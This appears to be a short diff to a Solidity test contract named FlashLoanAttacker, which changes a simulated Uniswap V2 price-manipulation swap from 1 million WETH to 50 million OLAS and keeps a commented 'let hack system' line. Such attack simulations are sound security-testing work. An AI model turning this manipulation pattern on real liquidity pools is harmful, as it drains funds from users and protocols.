@@ -105,9 +105,9 @@ contract FlashLoanAttacker {
         console.log("price0 before",price0);
         console.log("price1 before",price1);
         // Assume we have a 1 million OLAS balance
-        uint256 amountOut = getAmountOut(1_000_000 ether, reserve0, reserve1);
+        uint256 amountOut = getAmountOut(50_000_000 ether, reserve0, reserve1);
 
-        IWETH(WETH).transfer(pair, 1_000_000 ether);
+        IWETH(OLAS).transfer(pair, 50_000_000 ether);
 
         // let hack system
         // amountOut += 10000; Revert reason: UniswapV2: K
